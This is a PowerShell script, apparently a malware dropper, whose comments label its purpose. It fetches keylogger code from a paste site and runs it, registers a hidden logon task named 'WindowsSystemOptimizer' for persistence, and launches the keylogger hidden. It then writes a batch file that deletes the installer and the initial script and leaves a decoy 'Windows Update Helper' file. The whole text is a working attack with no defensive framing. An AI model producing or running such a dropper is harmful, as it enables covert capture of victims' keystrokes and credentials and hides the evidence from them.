
param(
    [Parameter(Mandatory=$true)]
    [string]$Password,  # ProtectedText password
    
    [Parameter(Mandatory=$true)]
    [string]$InitialScript  # Path to initial script
)

try {
    # 1. Download keylogger from ProtectedText
    $keyloggerScript = (Invoke-WebRequest -Uri "https://pastebin.com/raw/key_9321?action=read" `
        -Method Post -Body (@{password=$Password}|ConvertTo-Json) -ContentType "application/json" `
        -UseBasicParsing).Content
    
    # 2. Create persistence (Scheduled Task)
    $taskAction = New-ScheduledTaskAction -Execute "powershell.exe" `
        -Argument "-WindowStyle Hidden -Command `"$keyloggerScript`""
    $trigger = New-ScheduledTaskTrigger -AtLogOn
    Register-ScheduledTask -TaskName "WindowsSystemOptimizer" -Action $taskAction -Trigger $trigger -Force

    # 3. Execute keylogger immediately
    Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -Command `"$keyloggerScript`""
    
    # 4. Create self-deletion batch file
    $scriptPath = $MyInvocation.MyCommand.Path
    $batchContent = @"
@echo off
chcp 65001 >nul
timeout /t 2 /nobreak >nul

:: Delete installer
del /f /q "$scriptPath" >nul 2>&1

:: Delete initial script
del /f /q "$InitialScript" >nul 2>&1

:: Delete this batch file
del /f /q "%~f0" >nul 2>&1

:: Create decoy file
echo Windows Update Helper > "%TEMP%\update_helper.txt"
"@
    
    $batchFile = [System.IO.Path]::ChangeExtension($scriptPath, ".bat")
    $batchContent | Out-File $batchFile -Encoding UTF8
    
    # 5. Launch batch file and exit
    Start-Process $batchFile -WindowStyle Hidden
    exit 0
}
catch {
    # Still attempt cleanup on error
    if (Test-Path $batchFile) {
        Start-Process $batchFile -WindowStyle Hidden
    }
    exit 1
}
